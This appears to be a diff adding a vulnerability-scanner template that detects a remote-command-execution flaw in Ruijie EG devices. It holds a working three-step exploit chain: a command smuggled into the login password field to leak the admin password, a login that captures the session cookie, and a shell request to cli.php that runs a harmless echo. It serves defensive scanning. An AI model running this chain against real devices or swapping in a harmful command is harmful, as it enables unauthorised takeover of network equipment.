@@ -1,0 +1,61 @@
+id: ruijie-eg-cli-rce
+
+info:
+  name: Ruijie EG cli.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruijie EG systems allow attackers to execute arbitrary commands by exploiting a vulnerability in the cli.php endpoint. Attackers can potentially gain administrative access and execute system-level commands, leading to full device compromise.
+  tags: rce,command-execution
+
+variables:
+  marker: "46F9CBB4666FD9B109436288A339D72D"
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        username=admin&password=admin?show+webmaster+user
+    extractors:
+      - type: regex
+        name: password
+        internal: true
+        regex:
+          - "admin (.*?)\""
+
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        username=admin&password={{password}}
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+
+  - raw:
+      - |
+        POST /cli.php?a=shell HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Cookie: {{cookie}}
+
+        notdelay=true&command=echo+"{{marker}}"
+    matchers:
+      - type: word
+        words:
+          - "\"status\":true"
+          - "{{marker}}"
+        part: body
+    matchers-condition: and
